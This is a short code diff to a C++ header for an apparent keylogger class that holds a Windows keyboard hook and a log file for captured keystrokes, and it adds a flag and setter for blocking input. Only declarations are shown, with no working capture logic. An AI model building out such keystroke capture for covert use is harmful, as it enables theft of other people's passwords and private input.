@@ -19,6 +19,9 @@ private:
     // Handle to the keyboard hook
     HHOOK keyboardHook;
 
+    // Indicate whether to block input
+    bool blockInput;
+
     // File stream for saving logged key information
     std::ofstream logFile;
 
@@ -46,6 +49,9 @@ public:
 
     // Remove the keyboard hook and close the log file
     void Stop();
+
+    // Set the block input flag
+    void SetBlockInput(bool block);
 };
 
 #endif // KEY_LOGGER_H
